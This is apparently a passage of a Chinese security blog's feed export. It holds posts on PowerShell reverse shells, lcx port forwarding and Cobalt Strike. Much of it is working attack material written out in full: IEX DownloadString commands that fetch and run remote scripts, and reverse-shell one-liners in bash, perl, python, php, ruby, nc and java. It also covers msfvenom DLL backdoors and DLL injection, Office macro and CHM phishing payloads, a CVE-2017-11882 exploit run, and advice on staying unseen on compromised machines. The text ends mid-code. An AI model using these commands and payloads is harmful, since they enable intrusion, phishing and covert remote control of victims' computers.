    <content type="html"><![CDATA[<h1 id="powershell反弹shell"><a href="#powershell反弹shell" class="headerlink" title="powershell反弹shell"></a>powershell反弹shell</h1><h2 id="powercat反弹shell"><a href="#powercat反弹shell" class="headerlink" title="powercat反弹shell"></a>powercat反弹shell</h2><p>环境说明：</p><ul><li>攻击机1：KALI 192.168.209.159</li><li>攻击机2：ubuntu 192.168.209.155</li><li>目标机：win7 192.168.209.160</li></ul><p><strong>可以在GitHub上下载powercat：</strong></p><p><a href="https://github.com/besimorhino/powercat" target="_blank" rel="noopener">https://github.com/besimorhino/powercat</a></p><p>powercat为Powershell版的Netcat，实际上是一个powershell的函数，使用方法类似Netcat。</p><p>攻击机开启监听：</p><pre><code>nc -lvp 666</code></pre><p>或者用powercat监听：</p><pre><code>powercat -l -p 666</code></pre><p>目标机执行反弹cmd shell：</p><pre><code>powershell IEX (New-Object System.Net.Webclient).DownloadString(&apos;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&apos;);powercat -c 192.168.209.159 -p 6666 -e cmd</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxujq7s2rzj30hv01rq2r.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxujqds59gj30hf06dq68.jpg" alt=""></p><h2 id="nishang反弹shell"><a href="#nishang反弹shell" class="headerlink" title="nishang反弹shell"></a>nishang反弹shell</h2><p>Nishang(<a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang </a>)是一个基于PowerShell的攻击框架，集合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell。</p><h2 id="Reverse-TCP-shell"><a href="#Reverse-TCP-shell" class="headerlink" title="Reverse TCP shell"></a>Reverse TCP shell</h2><p>攻击机1（192.168.209.159）开启监听：</p><pre><code>nc -lvp 666</code></pre><p>目标机执行：</p><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.209.159 -port 6666</code></pre><p>或者将nishang下载到攻击者本地：</p><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.159.134/nishang/Shells/Invoke-PowerShellTcp.ps1&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.209.159 -port 6666</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuklpyrglj30i308zdig.jpg" alt=""></p><h2 id="Reverse-UDP-shell"><a href="#Reverse-UDP-shell" class="headerlink" title="Reverse UDP shell"></a>Reverse UDP shell</h2><p>攻击机1（192.168.209.159）开启监听：</p><pre><code>nc -lvup 123</code></pre><p>目标机执行：</p><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&apos;http://10.60.17.46/123.ps1&apos;);Invoke-PowerShellUdp -Reverse -IPAddress 192.168.209.159 -port 123</code></pre><blockquote><p>123.ps1为Invoke-PowerShellUdp.ps1，搭建了个网站IP为10.60.17.46</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuq2fok35j30ht060tam.jpg" alt=""></p><h2 id="Reverse-ICMP-shell"><a href="#Reverse-ICMP-shell" class="headerlink" title="Reverse ICMP shell"></a>Reverse ICMP shell</h2><p>需要利用icmpsh_m.py (<a href="https://github.com/inquisb/icmpsh" target="_blank" rel="noopener">https://github.com/inquisb/icmpsh</a>)和nishang中的Invoke-PowerShellIcmp.ps1 来反弹ICMP shell。</p><p>攻击机1下载icmpsh_m.py文件，并执行</p><p><code>python icmpsh_m.py [Attacker IP] [Victim IP]</code></p><pre><code>sysctl -w net.ipv4.icmp_echo_ignore_all=1 #忽略所有icmp包python icmpsh_m.py 192.168.209.159 192.168.209.160 #开启监听</code></pre><p>目标机执行：</p><pre><code>powershell iex(New-Object Net.WebClient).DownloadString(&apos;http://10.60.17.46/Invoke-PowerShellIcmp.ps1&apos;);Invoke-PowerShellIcmp -IPAddress 192.168.209.159</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuuo12w1cj30jm09y75t.jpg" alt=""></p><h2 id="自定义powershell函数反弹shell"><a href="#自定义powershell函数反弹shell" class="headerlink" title="自定义powershell函数反弹shell"></a>自定义powershell函数反弹shell</h2><p>利用<strong>powershell</strong>创建一个<strong>Net.Sockets.TCPClient</strong>对象，通过<strong>Socket</strong>反弹<strong>tcp shell</strong>，其实也是借鉴<strong>nishang</strong>中的<strong>Invoke-PowerShellTcpOneLine.ps1</strong></p><p>攻击机1（192.168.209.159）开启监听：</p><pre><code>nc -lvp 2333</code></pre><p>目标机执行：</p><pre><code>powershell -nop -c &quot;$client = New-Object Net.Sockets.TCPClient(&apos;192.168.209.159&apos;,2333);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &apos;PS &apos; + (pwd).Path + &apos;&gt; &apos;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuvui1lipj30ib03taas.jpg" alt=""></p><p>或者保存为lltest_tcp.ps1文件</p><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&apos;http://10.60.17.46/lltest_tcp.ps1&apos;);Invoke-lltestTcp</code></pre><p>lltest_tcp.ps1 如下：</p><pre><code>function Invoke-lltestTcp{$client = New-Object Net.Sockets.TCPClient(&apos;192.168.159.134&apos;,6666)$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0}while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)$sendback = (iex $data 2&gt;&amp;1 | Out-String )$sendback2 = $sendback + &apos;PS &apos; + (pwd).Path + &apos;&gt; &apos;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)$stream.Write($sendbyte,0,$sendbyte.Length)$stream.Flush()}$client.Close()}</code></pre><h2 id="dnscat2-反弹DNS-shell"><a href="#dnscat2-反弹DNS-shell" class="headerlink" title="dnscat2 反弹DNS shell"></a>dnscat2 反弹DNS shell</h2><p>dnscat2(<a href="https://github.com/iagox86/dnscat2" target="_blank" rel="noopener">https://github.com/iagox86/dnscat2</a>)是一个DNS隧道，旨在通过DNS协议创建加密的命令和控制（C＆C）通道。dnscat2分为两部分：客户端和服务器。dnscat2客户端采用C语言编写，服务器端采用ruby语言编写。后来又有安全研究人员使用PowerShell脚本重写了dnscat2客户端dnscat2-powershell(<a href="https://github.com/lukebaggett/dnscat2-powershell" target="_blank" rel="noopener">https://github.com/lukebaggett/dnscat2-powershell</a>)</p><p>利用dnscat2 和 dnscat2-powershell实现反弹DNS shell:</p><p>攻击者2(Ubuntu 192.168.209.155)开启监听：</p><pre><code>ruby dnscat2.rb --dns &quot;domain=lltest.com,host=192.168.209.155&quot; --no-cache -e open</code></pre><blockquote><p>-e open 不使用加密连接，默认使用加密</p></blockquote><ul><li>ruby dnscat2.rb —help 查看帮助</li></ul><p>目标机执行：</p><pre><code>powershell IEX (New-Object System.Net.Webclient).DownloadString(&apos;https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&apos;);Start-Dnscat2 -Domain lltest.com -DNSServer 192.168.209.155</code></pre><p>成功反弹shell后，攻击机2：</p><pre><code>session -i 1 #进入到session 1shell #执行之后会新生成一个session 需要通过session -i 2 切换session -i 2</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuyo6e3lkj30gr0d9js3.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuyp53vbcj30cc077mx8.jpg" alt=""></p><h2 id="Empire-结合office反弹shell"><a href="#Empire-结合office反弹shell" class="headerlink" title="Empire 结合office反弹shell"></a>Empire 结合office反弹shell</h2><p>Empire(<a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire</a>) 基于powershell的后渗透攻击框架，可利用office 宏、OLE对象插入批处理文件、HTML应用程序(HTAs)等进行反弹shell</p><h3 id="利用office-宏反弹shell"><a href="#利用office-宏反弹shell" class="headerlink" title="利用office 宏反弹shell"></a>利用office 宏反弹shell</h3><p>攻击者(192.168.209.159)开启监听:</p><pre><code>uselistener httpexecutebackusestager windows/macro http #生成payloadexecute</code></pre><p>生成/tmp/macro 攻击代码后，新建一个word 创建宏</p><p>点击<strong>“文件”-“宏”-“创建”</strong>，删除自带的脚本，复制进去<strong>/tmp/macro</strong>文件内容，并保存为<strong>“Word 97-2003文档(.doc)”</strong>或者<strong>“启用宏的Word 文档(.docm)”</strong>文档，当诱导目标打开，执行宏后，即可成功反弹shell：</p><blockquote><p>说明:需要开启宏或者用户手动启用宏。开启宏设置：<strong>“文件”-“选项”-“信任中心”</strong>,选择“启用所有宏”</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuzjkmh4jj30nr0g6ac1.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuzk0ox8cj30ol0dtwf0.jpg" alt=""></p><h2 id="PowerSploit-DLL注入反弹shell"><a href="#PowerSploit-DLL注入反弹shell" class="headerlink" title="PowerSploit DLL注入反弹shell"></a>PowerSploit DLL注入反弹shell</h2><p>PowerSploit是又一款基于powershell的后渗透攻击框架。PowerSploit包括Inject-Dll(注入dll到指定进程)、Inject-Shellcode（注入shellcode到执行进程）等功能。<br>利用msfvenom、metasploit和PowerSploit中的Invoke-DllInjection.ps1 实现dll注入，反弹shell</p><h3 id="msfvenom生成dll后门"><a href="#msfvenom生成dll后门" class="headerlink" title="msfvenom生成dll后门"></a>msfvenom生成dll后门</h3><p>目标机1执行：</p><pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.209.159 lport=4449 -f dll -o /var/www/html/test.dll</code></pre><blockquote><p>目标机64位 用x64 ； 32位的话用windows/meterpreter/reverse_tcp</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuzuqx202j30hc063n0j.jpg" alt=""></p><h3 id="metasploit-设置payload-开启监听"><a href="#metasploit-设置payload-开启监听" class="headerlink" title="metasploit 设置payload 开启监听"></a>metasploit 设置payload 开启监听</h3><p>攻击机1执行：</p><pre><code>use exploit/multi/handlerset PAYLOAD windows/x64/meterpreter/reverse_tcpset LHOST 192.168.209.159set LPORT 4449exploit</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuzyze3zgj30j80cvjyo.jpg" alt=""></p><h3 id="目标机远程下载"><a href="#目标机远程下载" class="headerlink" title="目标机远程下载"></a>目标机远程下载</h3><p>powershell 下载PowerSploit中Invoke-DllInjection.ps1和msfvenom生成的dll后门<br>首先上传dll文件到目标机。然后Get-Process 选定一个进程，最后注入到该进程</p><p>目标执行：</p><pre><code>Get-Process #查看进程进程</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxv3gxyplaj30i00bkdgb.jpg" alt=""></p><pre><code>IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.209.159/Invoke-DllInjection.ps1&apos;); Invoke-DllInjection -ProcessID 5448 -Dll C:\Users\郭翔\Desktop\test.dll</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxv3gbw7nzj30ec05iglm.jpg" alt=""></p><h2 id="metasploit反弹shell"><a href="#metasploit反弹shell" class="headerlink" title="metasploit反弹shell"></a>metasploit反弹shell</h2><p>利用metasploit的web_delivery模块可通过python、php、powershell、regsvr32等进行反弹shell</p><p>攻击者1(192.168.209.159)：</p><pre><code>msfconsoleuse exploit/multi/script/web_deliveryset PAYLOAD windows/meterpreter/reverse_tcpset target 2set LHOST 192.168.209.159set LPORT 123exploit</code></pre><p>执行完exploit后会弹出一段payload，将这段payload复制到目标机</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuzee76ukj30k505kn0l.jpg" alt=""></p><p>目标机执行：</p><pre><code>powershell.exe -nop -w hidden -c $f=new-object net.webclient;$f.proxy=[Net.WebRequest]::GetSystemWebProxy();$f.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $f.downloadstring(&apos;http://192.168.209.159:8080/1nLv5Znszan1&apos;);</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuzcyrpgnj30yd09547q.jpg" alt=""></p><h2 id="Cobalt-strike反弹shell"><a href="#Cobalt-strike反弹shell" class="headerlink" title="Cobalt strike反弹shell"></a>Cobalt strike反弹shell</h2><p>博客中有一个专门的文章对Cobalt strike做介绍。</p><h1 id="bash版本："><a href="#bash版本：" class="headerlink" title="bash版本："></a>bash版本：</h1><pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code></pre><blockquote><p>注意某些linux不支持</p></blockquote><p>这里shell由bash解析，有时候是由sh解析，不一定百发百中</p><p>这里<code>&amp;</code>在Linux shell中表示后台运行，当然这里<code>0&gt;&amp;1</code>不是这样,对于<code>&amp;1</code>更准确的说应该是文件描述符1,而1一般代表的就是STDOUT_FILENO</p><h1 id="perl版本"><a href="#perl版本" class="headerlink" title="perl版本:"></a>perl版本:</h1><pre><code>perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos;</code></pre><h1 id="python版本："><a href="#python版本：" class="headerlink" title="python版本："></a>python版本：</h1><pre><code>python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</code></pre><h1 id="php版本："><a href="#php版本：" class="headerlink" title="php版本："></a>php版本：</h1><pre><code>php -r &apos;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</code></pre><h1 id="ruby版本："><a href="#ruby版本：" class="headerlink" title="ruby版本："></a>ruby版本：</h1><pre><code>ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</code></pre><h1 id="nc版本："><a href="#nc版本：" class="headerlink" title="nc版本："></a>nc版本：</h1><pre><code>nc -e /bin/sh 10.0.0.1 1234rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1nc 10.0.0.1 1234 &gt;/tmp/fnc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999</code></pre><h1 id="java版本"><a href="#java版本" class="headerlink" title="java版本"></a>java版本</h1><pre><code>r = Runtime.getRuntime()p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])p.waitFor()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;powershell反弹shell&quot;&gt;&lt;a href=&quot;#powershell反弹shell&quot; class=&quot;headerlink&quot; title=&quot;powershell反弹shell&quot;&gt;&lt;/a&gt;powershell反弹shell&lt;/h1&gt;&lt;h2 id=&quot;power
      
    
    </summary>
    
      <category term="shell" scheme="http://yoursite.com/categories/shell/"/>
    
    
  </entry>
  
  <entry>
    <title>lcx使用:端口转发</title>
    <link href="http://yoursite.com/2018/12/03/lcx%E4%BD%BF%E7%94%A8-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    <id>http://yoursite.com/2018/12/03/lcx使用-端口转发/</id>
    <published>2018-12-03T13:59:05.000Z</published>
    <updated>2018-12-04T15:51:07.594Z</updated>
    
    <content type="html"><![CDATA[<p>端口映射在入侵内网的时候经常用到，特别是要登陆远程终端服务时，使用端口映射就非常方便。</p><p>Lcx.exe是一个端口转发工具，相当于把肉鸡A上的3389端口转发到具有外网IP地址的B机上,这样连接B机的3389就相当于连接A机的3389端口。Lcx程序多用于被控制计算机(肉鸡)处于内网的情况，被控制机可能中了木马程序，虽然能够进行控制，但还是没有使用远程终端登陆到本机进行管理方便，因此在很多情况下，都会想方设法在被控制计算机上开启3389端口，然后通过lcx等程序进行端口转发，进而在本地连接到被控制计算机的远程终端并进行管理和使用。</p><h1 id="三个功能"><a href="#三个功能" class="headerlink" title="三个功能"></a>三个功能</h1><h2 id="tran功能"><a href="#tran功能" class="headerlink" title="tran功能"></a>tran功能</h2><p>ran功能是端口转向功能，通过访问该端口可以直接与该主机或另一台的某一个端口进行通信。</p><p>例如：</p><h3 id="本机端口转向："><a href="#本机端口转向：" class="headerlink" title="本机端口转向："></a>本机端口转向：</h3><pre><code>lcx -tran 55 127.0.0.1 3389</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtx91elgyj30vw0enab4.jpg" alt=""></p><h3 id="转向其他主机端口："><a href="#转向其他主机端口：" class="headerlink" title="转向其他主机端口："></a>转向其他主机端口：</h3><p>肉机运行：</p><pre><code>lcx.exe -slave 10.60.17.46 55 192.168.209.160 3389</code></pre><p>操作机运行：</p><pre><code>lcx.exe -listen 55 3389</code></pre><p>【原来的图片丢了….只能借用一下别人的了】<br><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxv4w0r4fcj30hr09fjru.jpg" alt=""></p><p>在被控制计算机上使用<code>netstat -an</code>查看当前所有的连接时，可以看到被控制计算机时在跟自己进行远程终端连接，而实际的3389端口是跟本机的55端口进行连接的。</p><p><strong>注意：</strong></p><ul><li>如果被控制计算机是服务器，则在登陆时可以直接进行登陆;如果被控制计算机是Windows XP系统，则最好选择用户不在计算机的时间进行登陆，否则容易被发现。</li><li>不要轻易在被控制计算机上建立账号，尤其是Windows XP，建立帐号后，会立即在登陆界面中进行显示。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;端口映射在入侵内网的时候经常用到，特别是要登陆远程终端服务时，使用端口映射就非常方便。&lt;/p&gt;
&lt;p&gt;Lcx.exe是一个端口转发工具，相当于把肉鸡A上的3389端口转发到具有外网IP地址的B机上,这样连接B机的3389就相当于连接A机的3389端口。Lcx程序多用于被控制
      
    
    </summary>
    
      <category term="内网渗透工具" scheme="http://yoursite.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    
    
  </entry>
  
  <entry>
    <title>Cobalt Strike的使用</title>
    <link href="http://yoursite.com/2018/12/03/Cobalt-Strike%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://yoursite.com/2018/12/03/Cobalt-Strike的使用/</id>
    <published>2018-12-03T09:56:34.000Z</published>
    <updated>2018-12-03T11:46:51.611Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Cobalt-Strike简介："><a href="#Cobalt-Strike简介：" class="headerlink" title="Cobalt Strike简介："></a>Cobalt Strike简介：</h1><ul><li><strong>Cobalt Strike是一款渗透测试软件，分为客户端与服务端，服务端是一个，客户端可以有多个，可以进行团队分布式操作</strong></li><li><strong>Cobalt Strike集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。</strong></li></ul><h1 id="Cobalt-Strike的安装"><a href="#Cobalt-Strike的安装" class="headerlink" title="Cobalt Strike的安装"></a>Cobalt Strike的安装</h1><p>Ubuntu 默认只有openjdk的源，但是cobalt strike建议使用oracle jdk需要需要先加入源。</p><pre><code>apt-get install software-properties-common python-software-propertieadd-apt-repository ppa:webupd8team/javaapt-get updateapt-get install oracle-Java8-installer</code></pre><p>下载好Cobalt Strike工具然后解压缩。</p><p>进入Cobalt Strike文件内部开启服务</p><pre><code>sudo ./teamserver 10.60.17.46 123456</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtpo5e81zj30kb051759.jpg" alt=""></p><p><strong>后面这两个数是服务器IP（ubuntu的IP）和密码</strong></p><h3 id="配置客户端"><a href="#配置客户端" class="headerlink" title="配置客户端"></a>配置客户端</h3><p>客户端需要安装java环境，平台并无特殊要求。</p><p>启动：</p><ul><li>Ubuntu:<code>java-jar cobalt strike</code></li><li>windows直接双击启动</li></ul><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtrjw1900j30gb0ds0uu.jpg" alt=""></p><ul><li>host：服务器主机</li><li>port：50050</li><li>user：自定</li><li>password：服务器设置的</li></ul><h3 id="进入后首先配置监听器："><a href="#进入后首先配置监听器：" class="headerlink" title="进入后首先配置监听器："></a>进入后首先配置监听器：</h3><p>点击上方Cobalt Strike选项——&gt;在下拉框中选择listeners——&gt;在下方弹出区域中单机add</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtrlbdo9jj30ho0gi75u.jpg" alt=""></p><ul><li>name：为监听器名字。</li><li>选择payload类型</li><li>host为shell反弹接受主机（服务端IP）</li><li>port为反弹端口</li></ul><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtrpdchktj309506ddg2.jpg" alt=""></p><p>其实,监听器的作用很简单,主要是为了接受payload回传的各类数据</p><p>比如,我们的payload在目标机器执行以后,会回连到监听器然后下载执行真正的shellcode代码,其实跟msf中handler的作用基本是一致的</p><ul><li>beacon  为cs内置监听器,也就是说,当我们在目标系统成功执行payload以后,会弹回一个beacon的shell给cs 该shell所支持的通信协议主要包括这几种,dns,https,http,smb[pipe],另外,beacon shell的内置功能也非常多</li></ul><ul><li>foreign 主要是提供给外部使用的一些监听器,比如你想利用cs派生一个meterpreter的shell回来,来继续后面的内网渗透,这时就选择使用外部监听器</li></ul><h3 id="生成payload："><a href="#生成payload：" class="headerlink" title="生成payload："></a>生成payload：</h3><p>点击attacks——&gt;packages——&gt;windows executable</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtrtxrovnj30e008fjsh.jpg" alt=""></p><ul><li>listener为监听器名字</li><li>output为输出靶机类型。</li><li>点击generate弹出的对话框中选择保存位置和输入payload名字。</li></ul><p>在windows靶机中双击payload生成文件（artifact.exe）</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtrwdkheej30680a6abx.jpg" alt=""></p><p>得到反弹shell</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtrwozazij30lc0e5ta0.jpg" alt=""></p><p>主机上线以后需要将默认刷新时间改成0，cobalt strike为了维持连接，会每60秒发送一次连接，但是如果使用的话60秒会造成卡顿。</p><p>修改方法：右键弹出的内容下拉菜单中选择session-&gt;sleep，弹出的对话框中输入0，单击确定</p><p><strong>右键弹出的内容下拉菜单中选择Interact，上线主机。</strong></p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtrxwn4ggj30g90amgm3.jpg" alt=""></p><h2 id="office钓鱼"><a href="#office钓鱼" class="headerlink" title="office钓鱼"></a>office钓鱼</h2><p>office钓鱼在无需交互、用户无感知的情况下，执行Office文档中内嵌的一段恶意代码，从远控地址中下载并运行恶意可执行程序，例如远控木马或者勒索病毒等。</p><p>Cobalt Strike office钓鱼主要方法是生成一段vba代码，然后将代码复制到office套件中，当用户启动office自动运行</p><h3 id="具体操作："><a href="#具体操作：" class="headerlink" title="具体操作："></a>具体操作：</h3><p>点击Cobalt Strike主界面中attacks-&gt;packages-&gt;ms office macro</p><p>弹出界面选择Listener，单机确定</p><p>对话框中给出每一步仔细操作，单机copy macro按钮</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxts0m79xfj30f8095ta3.jpg" alt=""></p><h3 id="word操作"><a href="#word操作" class="headerlink" title="word操作"></a>word操作</h3><ul><li>点击上方标签视图标签</li><li>在该标签中点击宏按钮，弹出的对话框中输入宏名字，然后单机创建按钮</li></ul><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxts1ei6p6j30as09sq3l.jpg" alt=""></p><ul><li>首先清空所有代码，然后将生成的代码复制到编辑器中，关闭宏编辑窗口</li><li>保存退出</li><li>双击再次运行保存的文档</li></ul><p>当目标机器运行文档以后，Cobalt Strike会接受到目标机器反弹的shell</p><p>目标则会增加一个rundll32.exe的进程</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxts228nc4j30jg0bstdi.jpg" alt=""></p><h2 id="CVE-2017-11882漏洞简介"><a href="#CVE-2017-11882漏洞简介" class="headerlink" title="CVE-2017-11882漏洞简介"></a>CVE-2017-11882漏洞简介</h2><ul><li>漏洞为0ffice内存破坏漏洞，影响目前流行的所有0ffice版本。攻击者可以利用漏洞以当前登录的用户的身份执行任意命令。</li><li>该漏洞出现在模块EQNEDT32.EXE中，属于栈溢出漏洞，是对Equation Native 数据结构处理不当导致。</li></ul><h3 id="漏洞影响："><a href="#漏洞影响：" class="headerlink" title="漏洞影响："></a>漏洞影响：</h3><ul><li>Microsoft Office 2007</li><li>Microsoft Office 2010</li><li>Microsoft Office 2013</li><li>Microsoft Office 2016</li></ul><h3 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h3><p>下载<a href="https://github.com/Ridter/CVE-2017-11882python" target="_blank" rel="noopener">https://github.com/Ridter/CVE-2017-11882python</a>攻击脚本。</p><p>虽然是栈溢出漏洞，但是该漏洞对于命令有限制，分为可以执行43b和执行109b，所以在利用过程需要注意命令长度。</p><pre><code>python Command109b_CVE-2017-11882.py -c &quot;cmd.exe /c calc.exe&quot;</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxts7532m1j30ez06wjtz.jpg" alt=""></p><h2 id="CHM钓鱼"><a href="#CHM钓鱼" class="headerlink" title="CHM钓鱼"></a>CHM钓鱼</h2><h3 id="CHM介绍"><a href="#CHM介绍" class="headerlink" title="CHM介绍"></a>CHM介绍</h3><ul><li>CHM（Compiled Help Manual）即“已编译的帮助文件”。它是微软新一代的帮助文件格式，利用HTML作源文，把帮助内容以类似数据库的形式编译储存。</li><li>利用CHM钓鱼主要原因是因为该文档可以执行cmd命令</li></ul><p>这里制作CHM需要用到一个工具就是 <strong>EasyCHM</strong></p><h3 id="CHM制作过程："><a href="#CHM制作过程：" class="headerlink" title="CHM制作过程："></a>CHM制作过程：</h3><p>创建一个文件夹（名字随意），在文件夹里面再创建两个文件夹（名字随意）和一个index.html文件，在两个文件夹内部创建各创建一个index.html文件。</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtsaxyhptj30if04yt8t.jpg" alt=""></p><p>先将下列代码复制到根文件夹中的index.html中。</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;command exec &lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt; &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt; &lt;PARAM name=&quot;Item1&quot; value=&apos;,calc.exe&apos;&gt; &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;&lt;/OBJECT&gt;&lt;SCRIPT&gt;x.Click();&lt;/SCRIPT&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>打开我们的EasyCHM工具</p><p>后点击新建</p><p>然后导入自己创建的文件夹，点击确定后再点击编译，在弹出的对话框中点击生成CHM按钮</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtsbuxzlmj30hu0gpgmr.jpg" alt=""></p><p>它会给你生产一个CHM文件，给别人发过去，一旦点击就会给弹出计算机</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtsc8a106j30fn0df75c.jpg" alt=""></p><h3 id="生成钓鱼文件"><a href="#生成钓鱼文件" class="headerlink" title="生成钓鱼文件"></a>生成钓鱼文件</h3><p>启动Cobalt Strike，点击attacks——&gt;web Drive by——&gt;scripted web Delivery在弹出的对话框中将type类型设置为powershell然后单击launch按钮</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtse09s5lj30g20a60to.jpg" alt=""></p><p>再用代码将上面创建的根文件夹中的index.html代码中的calc.exe替换掉。</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtse84g0ij306w03zaa1.jpg" alt=""></p><pre><code> &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;command exec &lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt; &lt;PARAM name=&quot;Button&quot; 